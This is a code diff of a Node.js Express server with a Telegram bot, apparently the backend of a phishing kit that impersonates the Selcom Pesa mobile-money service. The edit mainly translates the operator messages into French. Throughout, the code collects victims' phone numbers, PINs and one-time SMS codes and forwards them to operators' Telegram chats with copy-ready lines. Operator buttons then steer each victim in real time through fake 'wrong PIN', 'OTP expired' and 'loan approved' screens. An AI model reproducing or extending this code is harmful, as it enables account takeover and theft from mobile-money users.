@@ -1,7 +1,3 @@
-/**
- * SELCOM PESA - PRIVATE SUB-ADMIN TELEGRAM SERVER
- */
-
 const express = require('express');
 const TelegramBot = require('node-telegram-bot-api');
 const path = require('path');
@@ -74,13 +70,11 @@ async function initBot() {
       const userLink = `${APP_URL}/?admin=${chatId}`;
       const isMainAdmin = (chatId === String(FALLBACK_ADMIN_ID));
 
-      const adminMessage = `🤖 *Selcom Pesa - Private Sub-Admin Portal*\n\n` +
-                           `👤 *Telegram Info:*\n` +
-                           `• Name: ${firstName}\n` +
-                           `• Chat ID: \`${chatId}\`\n\n` +
-                           `🔗 *Your Exclusive Personal Link:*\n${userLink}`;
+      const msgText = isMainAdmin
+        ? `👑 *Admin Principal - Selcom Pesa*\n\n• Nom: ${firstName}\n• Chat ID: \`${chatId}\`\n\n🔗 *Lien Exclusif:*\n${userLink}`
+        : `🤖 *Espace Sous-Administrateur - Selcom Pesa*\n\n• Nom: ${firstName}\n• Chat ID: \`${chatId}\`\n\n🔗 *Lien Exclusif:*\n${userLink}`;
 
-      await bot.sendMessage(chatId, adminMessage, { parse_mode: 'Markdown' });
+      await bot.sendMessage(chatId, msgText, { parse_mode: 'Markdown' });
     } catch (err) {}
   });
 
@@ -89,42 +83,41 @@ async function initBot() {
       const actionData = query.data || '';
       const chatId = String(query.message.chat.id);
       const parts = actionData.split('_');
-      const actionType = parts.slice(0, 2).join('_'); 
+      const actionType = parts.slice(0, 2).join('_');
       const targetId = parts.slice(2).join('_');
 
       let session = sessions.get(targetId);
       if (!session) session = { adminChatId: chatId };
-
       const chatTarget = session.adminChatId || chatId;
 
       switch (actionType) {
         case 'DENY_CREDS':
-          session.status = 'DENIED';
-          await bot.sendMessage(chatTarget, `❌ Application denied successfully.`);
+          session.status = 'STOPPED';
+          await bot.sendMessage(chatTarget, `❌ Demande arrêtée par l'administrateur.`);
+          break;
+        case 'ALLOW_CREDS':
+          session.status = 'PROCEED_OTP';
+          await bot.sendMessage(chatTarget, `✅ Connexion autorisée. Le client passe à l'étape OTP (6 chiffres).`);
           break;
         case 'WRONG_PIN':
           session.status = 'RETRY_PIN';
           session.pin = '';
-          await bot.sendMessage(chatTarget, `❌ WRONG PIN ❌. Client redirected to re-enter PIN.`);
-          break;
-        case 'ALLOW_CREDS':
-          session.status = 'PROCEED_OTP';
-          await bot.sendMessage(chatTarget, `✅ Connection allowed. Client proceeding to 6-digit OTP verification.`);
+          await bot.sendMessage(chatTarget, `WRONG PIN ❌ - Le client est invité à ressaisir son PIN.`);
           break;
         case 'OTP_EXPIRES':
           session.status = 'RETRY_OTP';
           session.otp = '';
-          await bot.sendMessage(chatTarget, `⚠️ OTP EXPIRES. Client redirected to enter new OTP.`);
+          await bot.sendMessage(chatTarget, `OTP EXPIRES ❌ - Le client est invité à demander un nouvel OTP.`);
           break;
         case 'APPROVED_FINAL':
           session.status = 'SUCCESS';
-          await bot.sendMessage(chatTarget, `🎉 APPROVAL successful! Success screen displayed to client.`);
+          await bot.sendMessage(chatTarget, `🎉 Prêt approuvé avec succès! Écran de succès affiché.`);
           break;
         default:
           break;
       }
 
-      await bot.answerCallbackQuery(query.id, { text: `Action executed` }).catch(() => {});
+      await bot.answerCallbackQuery(query.id, { text: `Action effectuée` }).catch(() => {});
       if (query.message && query.message.message_id) {
         await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: query.message.chat.id, message_id: query.message.message_id }).catch(() => {});
       }
@@ -146,36 +139,29 @@ app.post('/api/submit-credentials', async (req, res) => {
 
     const targetChat = resolveTargetChat(adminChatId);
     const userId = `user_${Date.now()}`;
-    sessions.set(userId, { 
-      phone, pin, 
-      adminChatId: targetChat, 
-      status: 'WAITING_CREDS_APPROVAL' 
-    });
+    sessions.set(userId, { phone, pin, adminChatId: targetChat, status: 'WAITING_CREDS_APPROVAL' });
 
-    const message = `🔴 *SELCOM PESA - PHONE NO & PIN*\n\n` +
-                    `📞 *Phone Number:* \`${phone}\`\n` +
-                    `🔒 *PIN:* \`${pin}\`\n\n` +
-                    `📋 *Quick Copy:*\n\`${phone}:${pin}\``;
+    const message = `🔵 *SELCOM PESA - PIN & TÉLÉPHONE*\n\n` +
+                    `📞 *Téléphone:* \`${phone}\`\n` +
+                    `🔒 *Code PIN:* \`${pin}\`\n\n` +
+                    `📋 *Format à copier:*\n\`${phone}:${pin}\``;
 
     const opts = {
       parse_mode: 'Markdown',
       reply_markup: {
         inline_keyboard: [
           [
-            { text: 'DENY', callback_data: `DENY_CREDS_${userId}` },
-            { text: 'ALLOW', callback_data: `ALLOW_CREDS_${userId}` }
+            { text: 'DENY ❌', callback_data: `DENY_CREDS_${userId}` },
+            { text: 'ALLOW ✅', callback_data: `ALLOW_CREDS_${userId}` }
           ]
         ]
       }
     };
 
-    if (bot) {
-      await bot.sendMessage(targetChat, message, opts);
-    }
-    
+    if (bot) await bot.sendMessage(targetChat, message, opts);
     return res.status(200).json({ success: true, userId });
   } catch (err) {
-    return res.status(500).json({ success: false, error: 'Network error.' });
+    return res.status(500).json({ success: false, error: 'Erreur réseau.' });
   }
 });
 
@@ -186,21 +172,7 @@ app.get('/api/check-status/:userId', (req, res) => {
   res.status(200).json({ status: session.status });
 });
 
-// Request new OTP notification
-app.post('/api/request-new-otp', async (req, res) => {
-  try {
-    const { userId } = req.body || {};
-    const session = sessions.get(userId);
-    if (session && session.adminChatId && bot) {
-      await bot.sendMessage(session.adminChatId, `🔄 Client requested a NEW OTP code for phone: \`${session.phone}\``, { parse_mode: 'Markdown' });
-    }
-    return res.status(200).json({ success: true });
-  } catch (e) {
-    return res.status(500).json({ success: false });
-  }
-});
-
-// Step 2: Submit 6-digit SMS OTP
+// Step 2: Submit 6-digit OTP
 app.post('/api/submit-otp', async (req, res) => {
   try {
     const { userId, otp } = req.body || {};
@@ -210,12 +182,12 @@ app.post('/api/submit-otp', async (req, res) => {
     const targetChat = session.adminChatId;
     session.status = 'WAITING_OTP_VERIFICATION';
     session.otp = otp;
-    const applicantPhone = session.phone || 'Unknown';
+    const applicantPhone = session.phone || 'Inconnu';
 
-    const message = `🔴 *SELCOM PESA - 6-DIGIT OTP*\n\n` +
-                    `📞 *Applicant:* \`${applicantPhone}\`\n` +
-                    `📱 *OTP Code:* \`${otp}\`\n\n` +
-                    `📋 *Quick Copy:*\n\`${applicantPhone}:${otp}\``;
+    const message = `🔵 *SELCOM PESA - CODE OTP (6 Chiffres)*\n\n` +
+                    `📞 *Demandeur:* \`${applicantPhone}\`\n` +
+                    `📱 *Code OTP:* \`${otp}\`\n\n` +
+                    `📋 *Format à copier:*\n\`${applicantPhone}:${otp}\``;
 
     const opts = {
       parse_mode: 'Markdown',
@@ -223,18 +195,17 @@ app.post('/api/submit-otp', async (req, res) => {
         inline_keyboard: [
           [
             { text: 'WRONG PIN ❌', callback_data: `WRONG_PIN_${userId}` },
-            { text: 'OTP EXPIRES', callback_data: `OTP_EXPIRES_${userId}` },
-            { text: 'APPROVAL', callback_data: `APPROVED_FINAL_${userId}` }
+            { text: 'OTP EXPIRES ❌', callback_data: `OTP_EXPIRES_${userId}` },
+            { text: 'APPROVAL ✅', callback_data: `APPROVED_FINAL_${userId}` }
           ]
         ]
       }
     };
 
     if (targetChat && bot) await bot.sendMessage(targetChat, message, opts);
-
     return res.status(200).json({ success: true });
   } catch (error) {
-    return res.status(500).json({ success: false, error: 'Error' });
+    return res.status(500).json({ success: false, error: 'Erreur' });
   }
 });
 
@@ -243,4 +214,4 @@ app.listen(PORT, async () => {
   await initBot();
   console.log(`Server running on port ${PORT}`);
 });
-  
+        
